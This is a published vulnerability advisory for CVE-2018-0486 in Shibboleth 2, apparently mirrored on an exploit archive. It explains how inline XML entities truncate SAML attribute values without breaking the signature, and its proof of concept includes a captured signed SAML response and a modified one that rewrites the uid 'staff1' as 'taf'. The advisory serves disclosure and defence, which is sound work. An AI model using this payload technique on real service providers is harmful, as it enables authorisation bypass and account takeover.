@@ -1,0 +1,382 @@
+id: 29533
+date: 01/16/2018
+title: Shibboleth 2 XML Injection Vulnerability
+author: RedTeam
+cves: CVE-2018-0486
+
+Truncation of SAML Attributes in Shibboleth 2
+
+RedTeam Pentesting discovered that the shibd service of Shibboleth 2
+does not extract SAML attribute values in a robust manner. By inserting
+XML entities into a SAML response, attackers may truncate attribute
+values without breaking the document's signature. This might lead to a
+complete bypass of authorisation mechanisms.
+
+
+Details
+=======
+
+Product: Shibboleth 2
+Affected Versions: before 2.6.1 (with XMLTooling-C prior 1.6.3)
+Fixed Versions: 2.6.1
+Vulnerability Type: Authorisation Bypass
+Security Risk: high
+Vendor URL: https://www.shibboleth.net/
+Vendor Status: notified
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-013
+Advisory Status: public
+CVE: CVE-2018-0486
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0486
+
+
+Introduction
+============
+
+"Shibboleth is among the world's most widely deployed federated identity
+solutions, connecting users to applications both within and between
+organizations. Every software component of the Shibboleth system is free
+and open source.
+
+Shibboleth is an open-source project that provides Single Sign-On
+capabilities and allows sites to make informed authorization decisions
+for individual access of protected online resources in a
+privacy-preserving manner."
+(from the Shibboleth Consortium's website [1])
+
+
+More Details
+============
+
+Shibboleth 2 makes use of SAML 2 to communicate assertions between
+identity providers and service providers. In some modes of operation,
+SAML messages are relayed through a user's browser. Therefore, their
+integrity must be protected. SAML accomplishes this by utilizing the XML
+signature standard [2] to sign its messages. When employing signatures,
+it is important that signed data is interpreted in a consistent manner
+by all parties.
+
+RedTeam Pentesting discovered that by inserting XML entities into a SAML
+response, the XML signature processor and the Shibboleth application
+will interpret the response differently. Parts of the document, for
+example values of SAML attributes, can partially be substituted by XML
+entities. An inline document type definition at the beginning of the XML
+document is inserted to define these entities. During signature
+verification, the XML document is canonicalized, which includes
+resolution of entities. The definition of all entities is chosen such
+that, after their resolution, the original contents of the XML document
+appear again. For example, if "RedTeam" was replaced with "Re&x;am", the
+entity "x" will be defined as the string "dTe". Consequently, the
+signature remains intact as the content of the document was not
+changed.
+
+After validating the signature of a SAML response, Shibboleth will
+extract various information from the document, such as the values of
+SAML attributes. Extracting strings from the XML DOM is implemented
+by the function shown below (shortened and re-formatted):
+
+------------------------------------------------------------------------
+void AbstractXMLObjectUnmarshaller::unmarshallContent(
+    const DOMElement* domElement)
+{
+    [...]
+    DOMNode* childNode = domElement->getFirstChild();
+    [...]
+    unsigned int position = 0;
+    while (childNode) {
+        if (childNode->getNodeType() == DOMNode::ELEMENT_NODE) {
+            [...]
+            // Advance the text node position marker.
+            ++position;
+        }
+        else if (
+            childNode->getNodeType() == DOMNode::TEXT_NODE
+            || childNode->getNodeType() == DOMNode::CDATA_SECTION_NODE
+        ) {
+            m_log.debug("processing text content at position (%d)",
+                position);
+            setTextContent(childNode->getNodeValue(), position);
+        }
+
+        childNode = childNode->getNextSibling();
+    }
+}
+------------------------------------------------------------------------
+
+This function fails to take into account the presence of sibling text
+and entity nodes in the DOM. The "position" variable is only incremented
+if an element node is encountered. If sibling text nodes are
+encountered, "setTextContent" will be called multiple times with
+"position" set to zero. Consequently, only the contents of the last
+sibling text node will be retrieved from the DOM. For example, consider
+the following XML snippet:
+
+<x>attacker&x;admin@example.net</x>
+
+When called on "<x>", the "unmarshallContent" function will first
+extract "attacker". The "&x;" entity will be ignored. Next,
+"admin@example.net" will be fetched from the DOM. However, as "position"
+was never incremented, this latter string overwrites the previously
+extracted data.
+
+By exploiting the behaviour of this function, attackers can truncate
+SAML attribute values. Arbitrary prefixes and or suffixes may be removed
+without breaking the XML signature.
+
+
+Proof of Concept
+================
+
+Exploitation of this vulnerability is demonstrated using the
+dockerized-idp-testbed [3] which implements a minimal Shibboleth
+infrastructure using multiple docker containers. It includes a sample
+PHP service provider that utilizes Apache mod_shib and shibd for
+authentication purposes. A Java-based Shibboleth identity provider is
+included which is backed by LDAP.
+
+First, the service provider application is accessed without
+authentication. It will generate a SAML request and redirect to the
+identity provider. Using the credentials "staff1:password"
+authentication is performed at the identity provider. Afterwards, the
+identity provider will redirect back to the service provider application
+using an HTTP POST request which includes a SAML response. This HTTP
+request is intercepted and the XML document is extracted:
+
+------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
+  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
+  ID="_04cfe67e596b7449d05755049ba9ec28"
+  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
+  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
+  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
+    https://idptestbed/idp/shibboleth
+  </saml2:Issuer>
+  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+    <ds:SignedInfo>
+      <ds:CanonicalizationMethod
+        Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+      <ds:SignatureMethod
+        Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha512"/>
+      <ds:Reference URI="#_04cfe67e596b7449d05755049ba9ec28">
+        <ds:Transforms>
+          <ds:Transform
+Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
+          <ds:Transform
+            Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+        </ds:Transforms>
+        <ds:DigestMethod
+          Algorithm="http://www.w3.org/2001/04/xmlenc#sha512"/>
+        <ds:DigestValue>
+          WOqxoqLlLBlkymI8WFIvMYK+8xakSCyuykHnD2ffLfM0rxRP3RrrYUETDo7Wx
+          8Hji4ECd70FvkhWM0Vwhfhuhg==
+        </ds:DigestValue>
+      </ds:Reference>
+    </ds:SignedInfo>
+    <ds:SignatureValue>
+VmfS2vJ2FnoB45rzSMrgOvqpMLqPuxV0e1dZA5L2DfcC8tJ6ao6GPE0pdsgYYyxdjI/eY4fM
+xnCLkeZfHPNt6lXa+/N1yWmxdWnhHJ9XYrWS+0Qgo7kdcWBDLIRjKdxnqYKrtT14I1qpSq2K
+gKeoFK2nZ2JkIH1F69Hj7GFT4gGFJY25RoKfOvcyI6Pb2MFT7PmmW5Fu2CoJRTOTpI3lyLq8
+3YCbNaX9khBdpe8oIA8T89kQuwOTy0rkqAMONh+OizTPVkaCldT39ohO/WZftS33zsC9UlSJ
+NPAnKlSHYuObZoB6tiU6qGX5SLhBYuy0kaA7WHl2Vu7bceXDlMvDqw==
+    </ds:SignatureValue>
+    <ds:KeyInfo>
+      <ds:X509Data>
+        <ds:X509Certificate>
+MIIDFDCCAfygAwIBAgIVAN3vv+b7KN5Se9m1RZsCllp/B/hdMA0GCSqGSIb3DQEBCwUAMBUx
+EzARBgNVBAMMCmlkcHRlc3RiZWQwHhcNMTUxMjExMDIyMDE0WhcNMzUxMjExMDIyMDE0WjAV
+MRMwEQYDVQQDDAppZHB0ZXN0YmVkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
+h91caeY0Q85uhaUyqFwP2bMjwMFxMzRlAoqBHd7gu6eo4duaeLz1BaoR2XTBpNNvFR5oHH+T
+kKahVDGeH5+kcnIpxI8JPdsZml1srvf2Z6dzJsulJZUdpqnngycTkGtZgEoC1vmYVky2BSAI
+Iifmdh6s0epbHnMGLsHzMKfJCb/Q6dYzRWTCPtzE2VMuQqqWgeyMr7u14x/Vqr9RPEFsgY8G
+Iu5jzB6AyUIwrLg+MNkv6aIdcHwxYTGL7ijfy6rSWrgBflQoYRYNEnseK0ZHgJahz4ovCag6
+wZAoPpBsuYlY7lEr89Ucb6NHx3uqGMsXlDFdE4QwfDLLhCYHPvJ0uwIDAQABo1swWTAdBgNV
+HQ4EFgQUAkOgED3iYdmvQEOMm6u/JmD/UTQwOAYDVR0RBDEwL4IKaWRwdGVzdGJlZIYhaHR0
+cHM6Ly9pZHB0ZXN0YmVkL2lkcC9zaGliYm9sZXRoMA0GCSqGSIb3DQEBCwUAA4IBAQBIdd4Y
+WlnvJjql8+zKKgmWgIY7U8DA8e6QcbAf8f8cdE33RSnjI63Xsv/y9GfmbAVAD6RIAXPFFeRY
+J08GOxGI9axfNaKdlsklJ9bk4ducHqgCSWYVer3sRQBjxyOfSTvk9YCJvdJVQRJLcCvxwKak
+FCsOSnV3t9OvN86Ak+fKPVB5j2fM/0fZKqjn3iqgdNPTLXPsuJLJO5lITRiBa4onmVelAiCs
+tI9PQiaEck+oAHnMTnC9JE/BDHv3e4rwq3LznlqPw0GSd7xqNTdMDwNOWjkuOr3sGpWS8ms/
+ZHHXV1Vd22uPe70is00xrv14zLifcc8oj5DYzOhYRifRXgHX
+        </ds:X509Certificate>
+      </ds:X509Data>
+    </ds:KeyInfo>
+  </ds:Signature>
+  <saml2p:Status>
+    <saml2p:StatusCode
+      Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
+  </saml2p:Status>
+  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
+    ID="_0d9bb7eeff709e93bc84196a815b5d2f"
+    IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
+    <saml2:Issuer>https://idptestbed/idp/shibboleth</saml2:Issuer>
+    <saml2:Subject>
+      <saml2:NameID
+        Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient"
+        NameQualifier="https://idptestbed/idp/shibboleth"
+        SPNameQualifier="https://sp.idptestbed/shibboleth">
+AAdzZWNyZXQxb597SlBurufjA6ok5OqWHfUFMVzkhgqw6ZMRuvy5mcH8jMNiaqA4DyyYJmjJ
+q3Da9qTcCFt1gom2qN7u+jqySIEDXGxwalmT0uYitXl5uSJ9rvZm4oc+5RcpU/bGUqxBU9Ce
+m7I=
+      </saml2:NameID>
+      <saml2:SubjectConfirmation
+        Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml2:SubjectConfirmationData Address="172.19.0.3"
+          InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
+          NotOnOrAfter="2017-12-08T15:20:56.077Z"
+          Recipient="https://idptestbed/Shibboleth.sso/SAML2/POST"/>
+      </saml2:SubjectConfirmation>
+    </saml2:Subject>
+    <saml2:Conditions NotBefore="2017-12-08T15:15:56.062Z"
+      NotOnOrAfter="2017-12-08T15:20:56.062Z">
+      <saml2:AudienceRestriction>
+        <saml2:Audience>
+          https://sp.idptestbed/shibboleth
+        </saml2:Audience>
+      </saml2:AudienceRestriction>
+    </saml2:Conditions>
+    <saml2:AuthnStatement AuthnInstant="2017-12-08T15:15:55.942Z"
+      SessionIndex="_4024a546cb14b165d953781d0472c105">
+      <saml2:SubjectLocality Address="172.19.0.3"/>
+      <saml2:AuthnContext>
+        <saml2:AuthnContextClassRef>
+urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
+        </saml2:AuthnContextClassRef>
+      </saml2:AuthnContext>
+    </saml2:AuthnStatement>
+    <saml2:AttributeStatement>
+      <saml2:Attribute FriendlyName="uid"
+        Name="urn:oid:0.9.2342.19200300.100.1.1"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue>
+          staff1
+        </saml2:AttributeValue>
+      </saml2:Attribute>
+      <saml2:Attribute FriendlyName="mail"
+        Name="urn:oid:0.9.2342.19200300.100.1.3"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue>
+          staff1@idptestbed.edu
+        </saml2:AttributeValue>
+      </saml2:Attribute>
+      <saml2:Attribute FriendlyName="sn" Name="urn:oid:2.5.4.4"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue>
+          aff
+        </saml2:AttributeValue>
+      </saml2:Attribute>
+      <saml2:Attribute FriendlyName="givenName"
+        Name="urn:oid:2.5.4.42"
+        NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+        <saml2:AttributeValue>
+          St
+        </saml2:AttributeValue>
+      </saml2:Attribute>
+    </saml2:AttributeStatement>
+  </saml2:Assertion>
+</saml2p:Response>
+------------------------------------------------------------------------
+
+Next, the SAML response is modified as follows:
+
+------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Response [
+  <!ENTITY s "s">
+  <!ENTITY f1 "f1">
+]>
+<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
+  Destination="https://idptestbed/Shibboleth.sso/SAML2/POST"
+  ID="_04cfe67e596b7449d05755049ba9ec28"
+  InResponseTo="_dbbb85ce7ff81905a3a7b4484afb3a4b"
+  IssueInstant="2017-12-08T15:15:56.062Z" Version="2.0">
+[...]
+  <saml2:Attribute FriendlyName="uid"
+    Name="urn:oid:0.9.2342.19200300.100.1.1"
+    NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
+    <saml2:AttributeValue>
+      &s;taf&f1;
+    </saml2:AttributeValue>
+  </saml2:Attribute>
+[...]
+</saml2p:Response>
+------------------------------------------------------------------------
+
+At the beginning of the document, an inline document type definition was
+inserted which defines two entities:
+
+ * &s; which resolves to the string "s"
+ * &f1; which resolves to the string "f1"
+
+Additionally, the value of the "uid" attribute is rewritten using these
+entities: The original value of "staff1" is replaced with "&s;taf&f1;".
+After these modifications, the XML document is re-inserted into the HTTP
+POST request which is then sent to the service provider.
+
+The SAML response is accepted by the service provider. Due to the
+vulnerability, the service provider application reports "taf" as the
+value of the "uid" attribute.
+
+
+Workaround
+==========
+
+The use of XML encryption can serve as a mitigation for this
+vulnerability but may still allow attacks in certain scenarios.
+
+
+Fix
+===
+
+Manually update to the latest version [4] as described in the security
+advisory published by Shibboleth [5]. Alternatively, use the operating
+system's package management to receive the update [6].
+
+Furthermore, a new version of the XMLTooling-C library (1.6.3) has been
+released to address this vulnerability. DTD processing is now disabled
+in the XML parser. Yet, some platforms ship with old parser versions
+that do not allow DTD processing to be disabled, namely Red Hat and
+CentOS.  Therefore, the "unmarshallContent" function has also been
+hardened to mitigate the vulnerability on these platforms.
+
+
+Security Risk
+=============
+
+The key feature of Shibboleth, secure transfer of assertions, is
+compromised. Therefore, the vulnerability is rated as a high risk. In
+certain circumstances, this might lead to a complete bypass of
+authorisation mechanisms. In practice, the risk for service providers is
+highly dependent on the actual deployment of the Shibboleth
+infrastructure: Sometimes, SAML responses are encrypted or not
+transferred through a browser. In this case, an attacker is not able to
+insert XML entities. Whether truncating SAML attribute values is
+profitable for attackers also depends on the actual use and structure of
+these values. Attackers may use an application's self-service features
+to change their account's email to a manipulated but valid address.
+Truncation of this email address in a SAML response could lead to access
+to further accounts, effectively bypassing authorisation mechanisms.
+
+
+Timeline
+========
+
+2017-11-06 Vulnerability identified
+2017-11-13 Customer approved further research
+2017-12-01 Further research conducted
+2018-01-09 Customer approved disclosure to vendor
+2018-01-10 Vendor notified
+2018-01-12 Vendor released fixed version
+2018-01-15 Advisory released
+
+
+References
+==========
+
+[1] https://www.shibboleth.net/
+[2] https://www.w3.org/TR/xmldsig-core/
+[3] https://github.com/UniconLabs/dockerized-idp-testbed
+[4] https://shibboleth.net/downloads/service-provider/2.6.1/
+[5] https://shibboleth.net/community/advisories/secadv_20180112.txt
+[6] https://security-tracker.debian.org/tracker/CVE-2018-0486
+
+#  0day.today [2023-03-22]  #
